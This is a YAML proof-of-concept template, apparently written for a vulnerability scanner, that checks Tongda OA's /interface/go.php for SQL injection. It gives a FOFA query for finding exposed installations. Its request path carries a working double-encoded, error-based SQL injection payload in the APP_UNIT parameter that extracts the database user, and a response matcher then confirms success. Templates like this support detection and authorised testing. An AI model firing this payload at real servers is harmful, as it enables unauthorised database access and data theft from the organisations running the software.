id: poc-yaml-tongda-interface-go-sqli
info:
  name: 通达OA /go.php SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 通达OA
  fofa: app="TDXK-通达OA"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: GET
  path: /interface/go.php?APP_UNIT=a%2527+and+1%3d(select+1+from(select+count(*),concat(md5({{.t1}}),0x7c,user(),0x7c,floor(rand(0)*2))x+from+information_schema.tables+group+by+x+limit+0,1)a)+and+%25271%2527=%25271
  expression: 'status_code == 200 && (

    contains(gbk_decode(body),`请联系管理员`) || contains(body,`请联系管理员`) ) && (

    contains(gbk_decode(body),`错误`) || contains(body,`错误`) ) &&

    contains(body,t2)

    '
transport: http
